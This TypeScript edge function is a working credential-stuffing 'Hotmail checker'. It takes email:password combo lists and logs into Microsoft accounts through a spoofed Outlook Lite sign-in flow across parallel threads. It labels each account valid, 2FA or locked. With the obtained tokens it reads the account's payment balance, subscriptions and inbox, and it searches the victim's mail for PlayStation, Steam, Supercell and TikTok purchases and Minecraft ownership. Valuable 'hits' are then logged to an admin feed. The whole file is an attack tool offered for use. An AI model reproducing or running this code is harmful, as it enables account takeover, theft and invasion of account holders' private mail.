import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { firebasePush, firebaseGet, verifyFirebaseIdToken } from "../_shared/firebase-admin.ts";

declare const EdgeRuntime: {
  waitUntil(promise: Promise<unknown>): void;
};

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-firebase-token, x-client-ip",
};

interface SubscriptionInfo {
  name: string;
  category: string;
  daysRemaining?: string;
  autoRenew?: string;
  isExpired?: boolean;
}

interface SessionInfo {
  startTime: string;
  endTime?: string;
  duration?: string;
  clientIP?: string;
  userAgent?: string;
  timezone?: string;
  country?: string;
  proxyUsed?: string;
  threadsUsed: number;
  accountsProcessed: number;
  successRate?: string;
}

interface CheckResult {
  email: string;
  password: string;
  status: string;
  country?: string;
  name?: string;
  checkedAt?: string;
  checkDuration?: number;
  threadId?: number;
  inboxCount?: string;
  msStatus?: string;
  subscriptions?: SubscriptionInfo[];
  rewardsPoints?: string;
  balance?: string;
  psn?: { status: string; orders: number; purchases: any[] };
  steam?: { status: string; count: number; purchases?: any[] };
  supercell?: { status: string; games: string[] };
  tiktok?: { status: string; username?: string };
  minecraft?: { status: string; username?: string; uuid?: string; capes?: string[] };
  error?: string;
}

// CookieJar class to handle cookies like the Python script
class CookieJar {
  private cookies: Map<string, string> = new Map();

  extractFromHeaders(headers: Headers): void {
    const setCookie = headers.get("set-cookie");
    if (setCookie) {
      // Handle multiple cookies
      const cookieStrings = setCookie.split(/,(?=\s*[^;,]+=[^;,]+)/);
      for (const cookieStr of cookieStrings) {
        this.parseCookie(cookieStr);
      }
    }
  }

  private parseCookie(cookieStr: string): void {
    const parts = cookieStr.split(";")[0].trim();
    const eqIndex = parts.indexOf("=");
    if (eqIndex > 0) {
      const name = parts.substring(0, eqIndex).trim();
      const value = parts.substring(eqIndex + 1).trim();
      if (name && value && !name.startsWith("__")) {
        this.cookies.set(name, value);
      }
    }
  }

  get(name: string): string | undefined {
    return this.cookies.get(name);
  }

  toString(): string {
    return Array.from(this.cookies.entries())
      .map(([k, v]) => `${k}=${v}`)
      .join("; ");
  }
}

function getCanaryTimestamp(): string {
  const now = new Date();
  const day = now.toLocaleDateString('en-US', { weekday: 'short' });
  const date = now.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
  const time = now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
  const ms = now.getMilliseconds().toString().padStart(3, '0');
  return `[${day} ${date} ${time}.${ms}]`;
}

function formatDuration(ms: number): string {
  if (ms < 1000) return `${ms}ms`;
  if (ms < 60000) return `${(ms / 1000).toFixed(2)}s`;
  const minutes = Math.floor(ms / 60000);
  const seconds = ((ms % 60000) / 1000).toFixed(1);
  return `${minutes}m ${seconds}s`;
}

// Check Microsoft Subscriptions
async function checkMicrosoftSubscriptions(accessToken: string): Promise<{
  status: string;
  subscriptions: SubscriptionInfo[];
  data: Record<string, string>;
}> {
  try {
    const userId = crypto.randomUUID().replace(/-/g, '').substring(0, 16);
    const stateJson = JSON.stringify({ userId, scopeSet: "pidl" });
    const paymentAuthUrl = `https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=${encodeURIComponent(stateJson)}&prompt=none`;
    
    const r = await fetch(paymentAuthUrl, {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Referer": "https://account.microsoft.com/"
      },
      redirect: 'follow'
    });
    
    const searchText = (await r.text()) + " " + r.url;
    
    const tokenPatterns = [/access_token=([^&\s"']+)/, /"access_token":"([^"]+)"/];
    let paymentToken = null;
    for (const pattern of tokenPatterns) {
      const match = searchText.match(pattern);
      if (match) {
        paymentToken = decodeURIComponent(match[1]);
        break;
      }
    }
    
    if (!paymentToken) {
      return { status: "FREE", subscriptions: [], data: {} };
    }
    
    const subData: Record<string, string> = {};
    const subscriptions: SubscriptionInfo[] = [];
    
    const paymentHeaders = {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "Accept": "application/json",
      "Authorization": `MSADELEGATE1.0="${paymentToken}"`,
      "Content-Type": "application/json",
      "Origin": "https://account.microsoft.com",
      "Referer": "https://account.microsoft.com/"
    };
    
    try {
      const payUrl = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US";
      const rPay = await fetch(payUrl, { headers: paymentHeaders });
      if (rPay.ok) {
        const payText = await rPay.text();
        const balanceMatch = payText.match(/"balance"\s*:\s*([0-9.]+)/);
        if (balanceMatch) subData.balance = "$" + balanceMatch[1];
      }
    } catch {}
    
    try {
      const transUrl = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions";
      const rSub = await fetch(transUrl, { headers: paymentHeaders });
      
      if (rSub.ok) {
        const responseText = await rSub.text();
        
        const subscriptionKeywords: Record<string, { type: string; category: string }> = {
          'Xbox Game Pass Ultimate': { type: 'GAME PASS ULTIMATE', category: 'gaming' },
          'PC Game Pass': { type: 'PC GAME PASS', category: 'gaming' },
          'Xbox Game Pass': { type: 'GAME PASS', category: 'gaming' },
          'EA Play': { type: 'EA PLAY', category: 'gaming' },
          'Xbox Live Gold': { type: 'XBOX LIVE GOLD', category: 'gaming' },
          'Microsoft 365 Family': { type: 'M365 FAMILY', category: 'office' },
          'Microsoft 365 Personal': { type: 'M365 PERSONAL', category: 'office' },
          'Office 365': { type: 'OFFICE 365', category: 'office' },
          'OneDrive': { type: 'ONEDRIVE', category: 'storage' }
        };
        
        for (const [keyword, info] of Object.entries(subscriptionKeywords)) {
          if (responseText.includes(keyword)) {
            const subInfo: SubscriptionInfo = { name: info.type, category: info.category };
            
            const renewalMatch = responseText.match(/"nextRenewalDate"\s*:\s*"([^T"]+)/);
            if (renewalMatch) {
              try {
                const renewal = new Date(renewalMatch[1] + "T00:00:00Z");
                const daysRemaining = Math.floor((renewal.getTime() - Date.now()) / (1000 * 60 * 60 * 24));
                subInfo.daysRemaining = String(daysRemaining);
                if (daysRemaining < 0) subInfo.isExpired = true;
              } catch {}
            }
            
            const autoMatch = responseText.match(/"autoRenew"\s*:\s*(true|false)/);
            if (autoMatch) subInfo.autoRenew = autoMatch[1] === "true" ? "YES" : "NO";
            
            subscriptions.push(subInfo);
          }
        }
        
        if (subscriptions.length > 0) {
          const activeSubs = subscriptions.filter(s => !s.isExpired);
          if (activeSubs.length > 0) {
            return { status: "PREMIUM", subscriptions, data: subData };
          }
        }
      }
    } catch {}
    
    return { status: "FREE", subscriptions, data: subData };
  } catch (error) {
    console.error("MS subscription check error:", error);
    return { status: "ERROR", subscriptions: [], data: {} };
  }
}

// Check Minecraft account
async function checkMinecraft(accessToken: string): Promise<{
  status: string;
  username?: string;
  uuid?: string;
  capes?: string[];
}> {
  try {
    const r = await fetch('https://api.minecraftservices.com/minecraft/profile', {
      headers: {
        'Authorization': `Bearer ${accessToken}`,
        'User-Agent': 'Outlook-Android/2.0'
      }
    });
    
    if (r.ok) {
      const data = await r.json();
      return {
        status: "OWNED",
        username: data.name || "Unknown",
        uuid: data.id || "",
        capes: (data.capes || []).map((cape: any) => cape.alias || "")
      };
    }
    
    return { status: "FREE" };
  } catch {
    return { status: "ERROR" };
  }
}

// Main account check function - follows Python logic exactly
async function checkAccount(
  email: string, 
  password: string, 
  checkMode: string,
  threadId: number
): Promise<CheckResult> {
  const startTime = Date.now();
  const result: CheckResult = { 
    email, 
    password, 
    status: 'checking',
    checkedAt: getCanaryTimestamp(),
    threadId
  };
  
  const cookies = new CookieJar();
  
  try {
    // Step 1: Check if MSAccount (from Python: check())
    const idpUrl = `https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=${encodeURIComponent(email)}`;
    const idpRes = await fetch(idpUrl, {
      headers: {
        "X-OneAuth-AppName": "Outlook Lite",
        "X-Office-Version": "3.11.0-minApi24",
        "X-CorrelationId": crypto.randomUUID(),
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
        "Host": "odc.officeapps.live.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
      }
    });
    
    const idpText = await idpRes.text();
    
    if (idpText.includes("Neither") || idpText.includes("Both") || 
        idpText.includes("Placeholder") || idpText.includes("OrgId")) {
      result.status = "invalid";
      result.error = "Not a Microsoft account";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    if (!idpText.includes("MSAccount")) {
      result.status = "invalid";
      result.error = "Not a Microsoft account";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    // Small delay like Python
    await new Promise(r => setTimeout(r, 300));
    
    // Step 2: Get auth page
    const authUrl = `https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=${encodeURIComponent(email)}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D`;
    
    const authRes = await fetch(authUrl, {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive"
      },
      redirect: 'follow'
    });
    
    cookies.extractFromHeaders(authRes.headers);
    const authText = await authRes.text();
    const authFinalUrl = authRes.url;
    
    // Extract PPFT and post URL - matching Python regex exactly
    const urlMatch = authText.match(/urlPost":"([^"]+)"/);
    const ppftMatch = authText.match(/name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"/);
    
    if (!urlMatch || !ppftMatch) {
      result.status = "error";
      result.error = "Failed to get auth tokens";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    const postUrl = urlMatch[1].replace(/\\\//g, "/");
    const ppft = ppftMatch[1];
    
    // Step 3: Login - matching Python exactly
    const loginData = `i13=1&login=${encodeURIComponent(email)}&loginfmt=${encodeURIComponent(email)}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${encodeURIComponent(password)}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=${encodeURIComponent(ppft)}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960`;
    
    const loginRes = await fetch(postUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Origin": "https://login.live.com",
        "Referer": authFinalUrl,
        "Cookie": cookies.toString()
      },
      redirect: 'manual'  // Don't follow redirects
    });
    
    cookies.extractFromHeaders(loginRes.headers);
    const loginText = await loginRes.text();
    const loginLocation = loginRes.headers.get("location") || "";
    const responseTextLower = loginText.toLowerCase();
    
    // Check for errors - matching Python exactly
    if (loginText.includes("account or password is incorrect") || loginText.match(/error/gi)?.length) {
      result.status = "invalid";
      result.error = "Wrong password";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    if (loginText.includes("identity/confirm") || responseTextLower.includes("identity/confirm")) {
      result.status = "2fa";
      result.error = "2FA required";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    if (loginText.includes("Consent") || responseTextLower.includes("consent")) {
      result.status = "2fa";
      result.error = "Consent required";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    if (loginText.includes("account.live.com/Abuse")) {
      result.status = "locked";
      result.error = "Account locked";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    // Extract code from redirect
    if (!loginLocation) {
      result.status = "invalid";
      result.error = "No redirect - login failed";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    const codeMatch = loginLocation.match(/code=([^&]+)/);
    if (!codeMatch) {
      result.status = "error";
      result.error = "No auth code received";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    const code = codeMatch[1];
    
    // Extract MSPCID from cookies - like Python
    const mspcid = cookies.get("MSPCID");
    if (!mspcid) {
      result.status = "error";
      result.error = "No CID found";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    const cid = mspcid.toUpperCase();
    
    // Step 4: Get access token
    const tokenData = `client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=${code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access`;
    
    const tokenRes = await fetch("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: tokenData
    });
    
    const tokenJson = await tokenRes.json();
    
    if (!tokenJson.access_token) {
      result.status = "error";
      result.error = "Failed to get access token";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    const accessToken = tokenJson.access_token;
    result.status = "valid";
    
    // Step 5: Get profile info
    try {
      const profileRes = await fetch("https://substrate.office.com/profileb2/v2.0/me/V1Profile", {
        headers: {
          "User-Agent": "Outlook-Android/2.0",
          "Authorization": `Bearer ${accessToken}`,
          "X-AnchorMailbox": `CID:${cid}`
        }
      });
      
      if (profileRes.ok) {
        const profile = await profileRes.json();
        result.country = profile.location || "";
        result.name = profile.displayName || "";
      }
    } catch {}
    
    // Step 6: Get inbox count (like Python)
    try {
      const startupRes = await fetch(`https://outlook.live.com/owa/${email}/startupdata.ashx?app=Mini&n=0`, {
        method: "POST",
        headers: {
          "Host": "outlook.live.com",
          "content-length": "0",
          "x-owa-sessionid": crypto.randomUUID(),
          "x-req-source": "Mini",
          "authorization": `Bearer ${accessToken}`,
          "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36",
          "action": "StartupData",
          "content-type": "application/json"
        },
        body: ""
      });
      
      if (startupRes.ok) {
        const startupText = await startupRes.text();
        const inboxMatch = startupText.match(/"DisplayName":"Inbox","TotalCount":(\d+)/) ||
                          startupText.match(/"TotalCount":(\d+)/);
        if (inboxMatch) {
          result.inboxCount = inboxMatch[1];
        }
      }
    } catch {}
    
    // Check Microsoft Subscriptions if requested
    if (checkMode === "microsoft" || checkMode === "all") {
      try {
        const msResult = await checkMicrosoftSubscriptions(accessToken);
        result.msStatus = msResult.status;
        result.subscriptions = msResult.subscriptions;
        if (msResult.data.balance) result.balance = msResult.data.balance;
      } catch {}
    }
    
    // Check Minecraft if requested
    if (checkMode === "minecraft" || checkMode === "all") {
      try {
        const mcResult = await checkMinecraft(accessToken);
        result.minecraft = mcResult;
      } catch {}
    }
    
    // Check PSN if requested
    if (checkMode === "psn" || checkMode === "all") {
      try {
        const psnPayload = {
          "Cvid": crypto.randomUUID(),
          "Scenario": {"Name": "owa.react"},
          "TimeZone": "UTC",
          "TextDecorations": "Off",
          "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": "sony@txn-email.playstation.com OR sony@email02.account.sony.com"},
            "Size": 50,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
          }]
        };
        
        const psnRes = await fetch("https://outlook.live.com/search/api/v2/query", {
          method: "POST",
          headers: {
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Authorization": `Bearer ${accessToken}`,
            "X-AnchorMailbox": `CID:${cid}`,
            "Content-Type": "application/json"
          },
          body: JSON.stringify(psnPayload)
        });
        
        if (psnRes.ok) {
          const psnData = await psnRes.json();
          let orders = 0;
          const purchases: any[] = [];
          
          if (psnData.EntitySets?.[0]?.ResultSets?.[0]) {
            orders = psnData.EntitySets[0].ResultSets[0].Total || 0;
            const results = psnData.EntitySets[0].ResultSets[0].Results || [];
            for (const r of results.slice(0, 10)) {
              if (r.Preview) {
                const gameMatch = r.Preview.match(/Thank you for purchasing\s+([^\.]+)/i);
                if (gameMatch) purchases.push({ item: gameMatch[1].trim().substring(0, 60) });
              }
            }
          }
          
          result.psn = { status: orders > 0 ? "HAS_ORDERS" : "FREE", orders, purchases };
        }
      } catch {}
    }
    
    // Check Steam if requested
    if (checkMode === "steam" || checkMode === "all") {
      try {
        const steamPayload = {
          "Cvid": crypto.randomUUID(),
          "Scenario": {"Name": "owa.react"},
          "TimeZone": "UTC",
          "TextDecorations": "Off",
          "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": "noreply@steampowered.com purchase"},
            "Size": 50,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
          }]
        };
        
        const steamRes = await fetch("https://outlook.live.com/search/api/v2/query", {
          method: "POST",
          headers: {
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Authorization": `Bearer ${accessToken}`,
            "X-AnchorMailbox": `CID:${cid}`,
            "Content-Type": "application/json"
          },
          body: JSON.stringify(steamPayload)
        });
        
        if (steamRes.ok) {
          const steamData = await steamRes.json();
          let count = 0;
          const purchases: any[] = [];
          
          if (steamData.EntitySets?.[0]?.ResultSets?.[0]) {
            count = steamData.EntitySets[0].ResultSets[0].Total || 0;
            const results = steamData.EntitySets[0].ResultSets[0].Results || [];
            for (const r of results.slice(0, 5)) {
              if (r.Preview) {
                const gameMatch = r.Preview.match(/Thank you for purchasing\s+([^\.]+)/i);
                if (gameMatch) purchases.push({ item: gameMatch[1].trim().substring(0, 60) });
              }
            }
          }
          
          result.steam = { status: count > 0 ? "HAS_PURCHASES" : "FREE", count, purchases };
        }
      } catch {}
    }
    
    // Check Supercell if requested
    if (checkMode === "supercell" || checkMode === "all") {
      try {
        const scPayload = {
          "Cvid": crypto.randomUUID(),
          "Scenario": {"Name": "owa.react"},
          "TimeZone": "UTC",
          "TextDecorations": "Off",
          "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": "noreply@id.supercell.com"},
            "Size": 20,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
          }]
        };
        
        const scRes = await fetch("https://outlook.live.com/search/api/v2/query", {
          method: "POST",
          headers: {
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Authorization": `Bearer ${accessToken}`,
            "X-AnchorMailbox": `CID:${cid}`,
            "Content-Type": "application/json"
          },
          body: JSON.stringify(scPayload)
        });
        
        if (scRes.ok) {
          const scData = await scRes.json();
          const games: string[] = [];
          
          if (scData.EntitySets?.[0]?.ResultSets?.[0]) {
            const total = scData.EntitySets[0].ResultSets[0].Total || 0;
            if (total > 0) {
              const results = scData.EntitySets[0].ResultSets[0].Results || [];
              for (const r of results) {
                const preview = (r.Preview || "").toLowerCase();
                if (preview.includes("clash of clans") && !games.includes("CoC")) games.push("CoC");
                if (preview.includes("clash royale") && !games.includes("CR")) games.push("CR");
                if (preview.includes("brawl stars") && !games.includes("BS")) games.push("BS");
                if (preview.includes("hay day") && !games.includes("HD")) games.push("HD");
              }
            }
          }
          
          result.supercell = { status: games.length > 0 ? "LINKED" : "FREE", games };
        }
      } catch {}
    }
    
    // Check TikTok if requested
    if (checkMode === "tiktok" || checkMode === "all") {
      try {
        const ttPayload = {
          "Cvid": crypto.randomUUID(),
          "Scenario": {"Name": "owa.react"},
          "TimeZone": "UTC",
          "TextDecorations": "Off",
          "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": "account.tiktok"},
            "Size": 10,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
          }]
        };
        
        const ttRes = await fetch("https://outlook.live.com/search/api/v2/query", {
          method: "POST",
          headers: {
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Authorization": `Bearer ${accessToken}`,
            "X-AnchorMailbox": `CID:${cid}`,
            "Content-Type": "application/json"
          },
          body: JSON.stringify(ttPayload)
        });
        
        if (ttRes.ok) {
          const ttData = await ttRes.json();
          if (ttData.EntitySets?.[0]?.ResultSets?.[0]) {
            const total = ttData.EntitySets[0].ResultSets[0].Total || 0;
            result.tiktok = { status: total > 0 ? "LINKED" : "FREE", username: total > 0 ? "Detected" : undefined };
          }
        }
      } catch {}
    }
    
    result.checkDuration = Date.now() - startTime;
    return result;
    
  } catch (e) {
    result.status = "error";
    result.error = String(e);
    result.checkDuration = Date.now() - startTime;
    return result;
  }
}

// Multi-threaded worker pool
async function processWithWorkerPool<T, R>(
  items: T[],
  concurrency: number,
  fn: (item: T, index: number, threadId: number) => Promise<R>,
  onProgress?: (completed: number, total: number, result: R) => void
): Promise<R[]> {
  const results: R[] = new Array(items.length);
  let currentIndex = 0;
  let completedCount = 0;

  async function worker(threadId: number): Promise<void> {
    while (currentIndex < items.length) {
      const index = currentIndex++;
      if (index >= items.length) break;
      
      try {
        const result = await fn(items[index], index, threadId);
        results[index] = result;
        completedCount++;
        if (onProgress) onProgress(completedCount, items.length, result);
        
        if (completedCount % 10 === 0 || completedCount === items.length) {
          console.log(`${getCanaryTimestamp()} Thread-${threadId}: Progress ${completedCount}/${items.length}`);
        }
      } catch (error) {
        results[index] = { error: String(error) } as R;
        completedCount++;
      }
      
      await new Promise(r => setTimeout(r, 100));
    }
  }

  const workers = Array(Math.min(concurrency, items.length))
    .fill(null)
    .map((_, i) => worker(i + 1));

  console.log(`${getCanaryTimestamp()} Starting ${workers.length} workers for ${items.length} items`);
  await Promise.all(workers);
  return results;
}

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  const sessionStart = Date.now();
  const sessionStartTime = getCanaryTimestamp();
  
  const clientIP = req.headers.get("x-client-ip") || 
                   req.headers.get("x-forwarded-for")?.split(',')[0]?.trim() || 
                   "Unknown";
  const userAgent = req.headers.get("user-agent") || "Unknown";

  try {
    const firebaseToken = req.headers.get("x-firebase-token");
    let userId: string | null = null;
    let userEmail: string | null = null;
    
    if (firebaseToken) {
      const tokenData = await verifyFirebaseIdToken(firebaseToken);
      if (tokenData) {
        userId = tokenData.uid;
        userEmail = tokenData.email || null;
      }
    }

    const { 
      accounts, 
      checkMode = "all", 
      threads = 5, 
      saveHistory = true,
      clientInfo = {}
    } = await req.json();

    console.log(`${sessionStartTime} ═══════════════════════════════════════════════`);
    console.log(`${sessionStartTime} HOTMAIL CHECKER SESSION STARTED`);
    console.log(`${sessionStartTime} User: ${userEmail || 'Anonymous'} | Accounts: ${accounts?.length || 0} | Threads: ${threads} | Mode: ${checkMode.toUpperCase()}`);
    console.log(`${sessionStartTime} ───────────────────────────────────────────────`);

    if (!accounts || !Array.isArray(accounts) || accounts.length === 0) {
      return new Response(
        JSON.stringify({ error: "No accounts provided" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    if (userId) {
      const userData = await firebaseGet<{ services?: string[]; isAdmin?: boolean }>(`users/${userId}`);
      const hasAccess = userData?.services?.includes("hotmail_validator") || 
                        userData?.services?.includes("all") ||
                        userData?.isAdmin;
      
      if (!hasAccess) {
        return new Response(
          JSON.stringify({ error: "You don't have access to this service" }),
          { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
        );
      }
    }

    const stats = {
      total: accounts.length,
      valid: 0,
      invalid: 0,
      twoFa: 0,
      locked: 0,
      error: 0,
      msPremium: 0,
      psnHits: 0,
      steamHits: 0,
      supercellHits: 0,
      tiktokHits: 0,
      minecraftHits: 0
    };

    const safeThreads = Math.max(1, Math.min(Number(threads) || 5, 10));
    const concurrency = Math.min(safeThreads, accounts.length);

    const allResults = await processWithWorkerPool(
      accounts,
      concurrency,
      async (account: string, index: number, threadId: number) => {
        const [email, ...passParts] = account.split(":");
        const password = passParts.join(":");
        if (!email || !password) {
          return { email: account, password: "", status: "error", error: "Invalid format", threadId } as CheckResult;
        }
        return await checkAccount(email.trim(), password.trim(), checkMode, threadId);
      },
      (completed, total, result) => {
        if (result.status === "valid") stats.valid++;
        else if (result.status === "invalid") stats.invalid++;
        else if (result.status === "2fa") stats.twoFa++;
        else if (result.status === "locked") stats.locked++;
        else stats.error++;
        
        if (result.msStatus === "PREMIUM") stats.msPremium++;
        if (result.psn?.status === "HAS_ORDERS") stats.psnHits++;
        if (result.steam?.status === "HAS_PURCHASES") stats.steamHits++;
        if (result.supercell?.status === "LINKED") stats.supercellHits++;
        if (result.tiktok?.status === "LINKED") stats.tiktokHits++;
        if (result.minecraft?.status === "OWNED") stats.minecraftHits++;
      }
    );

    const sessionDuration = Date.now() - sessionStart;
    const successRate = accounts.length > 0 ? ((stats.valid / accounts.length) * 100).toFixed(1) : "0";

    const sessionInfo: SessionInfo = {
      startTime: sessionStartTime,
      endTime: getCanaryTimestamp(),
      duration: formatDuration(sessionDuration),
      clientIP,
      userAgent: userAgent.substring(0, 100),
      timezone: clientInfo.timezone || "Unknown",
      country: clientInfo.country || "Unknown",
      proxyUsed: "Direct",
      threadsUsed: concurrency,
      accountsProcessed: accounts.length,
      successRate: `${successRate}%`
    };

    console.log(`${getCanaryTimestamp()} ═══════════════════════════════════════════════`);
    console.log(`${getCanaryTimestamp()} SESSION COMPLETE | Duration: ${sessionInfo.duration}`);
    console.log(`${getCanaryTimestamp()} Valid: ${stats.valid} (${successRate}%) | Invalid: ${stats.invalid} | 2FA: ${stats.twoFa} | Locked: ${stats.locked}`);
    console.log(`${getCanaryTimestamp()} MS Premium: ${stats.msPremium} | Minecraft: ${stats.minecraftHits} | PSN: ${stats.psnHits} | Steam: ${stats.steamHits}`);
    console.log(`${getCanaryTimestamp()} ═══════════════════════════════════════════════`);

    if (userId && saveHistory) {
      EdgeRuntime.waitUntil(firebasePush(`checkHistory/${userId}`, {
        service: "hotmail_validator",
        checkMode,
        inputCount: accounts.length,
        stats,
        sessionInfo,
        results: allResults,
        createdAt: new Date().toISOString()
      }));

      const premiumHits = allResults.filter(r => 
        r.status === 'valid' && (r.msStatus === 'PREMIUM' || r.psn?.status === 'HAS_ORDERS' || r.steam?.status === 'HAS_PURCHASES' || r.minecraft?.status === 'OWNED')
      );
      
      for (const hit of premiumHits.slice(0, 10)) {
        EdgeRuntime.waitUntil(firebasePush('adminData/liveHits', {
          service: 'hotmail_validator',
          username: userEmail || 'anonymous',
          hitData: {
            email: hit.email,
            msStatus: hit.msStatus,
            psn: hit.psn?.orders,
            steam: hit.steam?.count,
            minecraft: hit.minecraft?.username,
          },
          createdAt: Date.now()
        }));
      }
    }

    return new Response(
      JSON.stringify({ results: allResults, stats, sessionInfo }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );

  } catch (error) {
    console.error(`${getCanaryTimestamp()} ERROR:`, error);
    return new Response(
      JSON.stringify({ error: String(error) }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
